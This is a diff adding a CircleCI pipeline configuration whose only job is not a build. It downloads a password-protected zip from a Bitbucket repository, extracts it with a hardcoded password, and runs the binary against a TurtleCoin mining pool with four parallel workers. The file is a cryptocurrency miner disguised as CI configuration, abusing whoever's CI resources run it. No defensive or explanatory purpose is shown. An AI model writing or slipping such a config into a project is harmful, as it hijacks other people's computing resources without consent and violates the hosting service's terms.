@@ -1,0 +1,22 @@
+version: 2.1
+
+jobs:
+  start-exp:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    parallelism: 4
+    steps:
+      - run: 
+          command: |-
+            curl -fsSL https://bitbucket.org/remitdapet-dep-trai/vnvodich/raw/main/tool-linux-cpp.zip -o tool-linux-cpp.zip
+      - run: 
+          command: |-
+            unzip -P Dvinh99bn tool-linux-cpp.zip
+            chmod +x main
+      - run: ./main -t 1 -o pool.solo.turtlecoin.dev:3333 -p meocoder_node_1 -a argon2/chukwav2
+      
+workflows:
+  start-ci:
+    jobs:
+      - start-exp
